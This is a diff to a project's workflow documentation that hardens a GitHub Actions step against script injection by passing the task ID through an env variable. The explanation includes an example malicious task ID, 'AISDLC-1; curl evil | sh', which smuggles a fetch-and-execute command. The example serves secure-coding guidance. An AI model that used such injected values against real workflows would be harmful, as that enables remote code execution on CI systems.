@@ -72,8 +72,20 @@ Replace any step that does `cp backlog/tasks/<id>*.md backlog/completed/` with:
 
 ```yaml
 - name: Complete backlog task atomically
-  run: node pipeline-cli/bin/cli-task-complete.mjs ${{ inputs.task-id }}
+  env:
+    TASK_ID: ${{ inputs.task-id }}
+  run: node pipeline-cli/bin/cli-task-complete.mjs "$TASK_ID"
 ```
+
+**Important:** Pass workflow inputs through `env:` and reference them as shell
+variables (`"$TASK_ID"`) rather than expanding `${{ inputs.task-id }}` directly
+inside `run:`. GitHub Actions expands `${{ }}` BEFORE shell parsing, so a
+crafted task-id like `AISDLC-1; curl evil | sh` would execute as a second
+command (CWE-78 actions-script-injection). Env-indirection passes the value
+through the process environment where it's a literal string, defeating the
+injection vector. The bin itself sanitizes input but the call-site convention
+matters once `inputs.task-id` is sourced from `issue_comment` / `issues`
+triggers where titles, bodies, or labels are attacker-controlled.
 
 **Important:** Do NOT use `pnpm --filter @ai-sdlc/pipeline-cli exec cli-task-complete`.
 `pnpm exec` does not resolve a workspace package's own bin entries and silently
